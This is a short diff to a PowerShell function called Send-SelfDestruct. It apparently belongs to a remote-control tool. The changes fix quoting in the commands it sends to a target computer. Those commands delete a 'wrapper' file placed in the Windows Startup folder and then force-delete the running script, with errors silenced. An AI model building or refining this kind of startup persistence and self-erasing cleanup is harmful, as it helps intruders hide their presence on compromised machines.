@@ -500,7 +500,7 @@ function Send-SelfDestruct {
         switch ($wrapperPathChoice) {
             "1" {
                 $wrapperFileName = Read-Host "STARTUP\"
-                $wrapperPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath('Startup'), $wrapperFileName)
+                $wrapperPath = "`$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$wrapperFileName"
             }
             "2" {
                 $wrapperPath = Read-Host "Path"
@@ -512,7 +512,7 @@ function Send-SelfDestruct {
         }
         Write-Host ""
         if ($wrapperPath) {
-            $removeCommand = "Remove-Item '$wrapperPath' -Force -ErrorAction SilentlyContinue; "
+            $removeCommand = "Remove-Item `"$wrapperPath`" -Force -ErrorAction SilentlyContinue; "
         }
     }
 
@@ -544,7 +544,7 @@ function Send-SelfDestruct {
         $fileContent = if ($TargetComputer) { "/$TargetComputer" } else { "" }
         if ($removeCommand) {
             $fileContent += "`nWRAPPER_REMOVAL:`n$removeCommand`n" + 
-                           "Remove-Item '$PSCommandPath' -Force -ErrorAction SilentlyContinue"
+                           "Remove-Item '`$PSCommandPath' -Force -ErrorAction SilentlyContinue"
         }
 
         $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)
@@ -558,7 +558,7 @@ function Send-SelfDestruct {
         }
 
         if ($removeCommand) {
-            Write-Host "Wrapper removal command included for: $wrapperName" -ForegroundColor DarkGreen
+            Write-Host "Wrapper removal command included for: $wrapperPath" -ForegroundColor DarkGreen
         }
 
         Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
